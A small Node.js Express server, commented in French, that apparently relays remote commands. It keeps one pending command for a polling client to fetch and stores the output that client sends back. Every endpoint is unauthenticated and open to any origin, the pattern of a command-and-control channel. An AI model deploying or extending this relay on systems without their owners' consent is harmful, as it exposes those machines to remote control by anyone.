const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");

const app = express();
app.use(cors());
app.use(bodyParser.json());

let currentCommand = "";
let lastResult = "";
let resultSent = true; // Indique si lastResult a déjà été envoyé

app.get("/", (req, res) => {
  res.send("✅ Serveur en ligne !");
});

app.get("/get-command", (req, res) => {
  res.send(currentCommand || "");
});

app.post("/set-command", (req, res) => {
  const { cmd } = req.body;
  currentCommand = cmd;
  lastResult = "";     // On reset lastResult à chaque nouvelle commande
  resultSent = false;  // Nouveau résultat attendu
  console.log("✅ Commande reçue :", cmd);
  res.send("Commande enregistrée.");
});

app.post("/send-result", (req, res) => {
  const { result } = req.body;
  lastResult = result;
  currentCommand = "";  // Reset commande pour ne pas réexécuter
  resultSent = false;   // Nouveau résultat prêt à être envoyé
  console.log("✅ Résultat reçu :", result);
  res.send("Résultat enregistré.");
});

app.get("/get-result", (req, res) => {
  if (!resultSent && lastResult) {
    // Envoi du résultat une seule fois
    res.send(lastResult);
    resultSent = true;   // Marque comme envoyé
    lastResult = "";     // Vider pour ne pas ré-envoyer
  } else {
    res.send(""); // Pas de nouveau résultat
  }
});

app.listen(3000, () => {
  console.log("🌐 Serveur démarré sur le port 3000");
});
